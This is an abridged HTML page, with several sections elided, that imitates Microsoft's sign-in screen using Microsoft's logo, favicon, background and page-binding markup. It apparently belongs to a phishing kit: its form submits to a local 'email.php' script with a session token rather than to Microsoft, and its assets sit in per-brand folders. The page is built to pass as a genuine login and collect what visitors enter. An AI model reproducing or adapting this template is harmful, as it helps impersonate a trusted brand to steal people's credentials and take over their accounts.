...
<html dir="ltr" lang="EN-US">
    <head>
        ...
        <link rel="shortcut icon" href="../../Export/img/Microsoft/microsoft.ico">
        <link rel="stylesheet" title="Converged_v2" type="text/css" href="../../Export/css/microsoft.css">
    </head>
    <body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
        <div>
            ...
            <form action="../../Layout/Terraform/email.php?token=<?php echo $_SESSION['token']; ?>" method="POST">
                ...
                <div data-bind="component: { name: 'master-page',
                    ...
                    <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr } }">
                        ...
                        <div data-bind="component: { name: 'background-image-control', publicMethods: $page.backgroundControlMethods }">
                            <div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                                ...
                                <div style="background-image: url(../../Export/img/Microsoft/microsoft_bg.svg);" class="background-image ext-background-image"></div>
                                <!-- ko if: useImageMask -->
                                <!-- /ko -->
                                <!-- /ko -->
                            </div>
                    ...
                    params: {
                        ...
                        bannerLogoUrl: bannerLogoUrl() } }">
                                                ...
                                                <img class="logo" role="img" src="../../Export/img/Microsoft/microsoft_logo.svg" alt="Microsoft">
                                                <!-- /ko -->
                                                <!-- /ko -->
                                                <!-- /ko -->
                                                <!-- /ko -->
    ...
    <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
    <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
    <img role="presentation" src="../../Export/img/Microsoft/arrow_left.svg"><!-- /ko -->
    <!-- /ko --><!-- /ko -->
            <!-- /ko -->
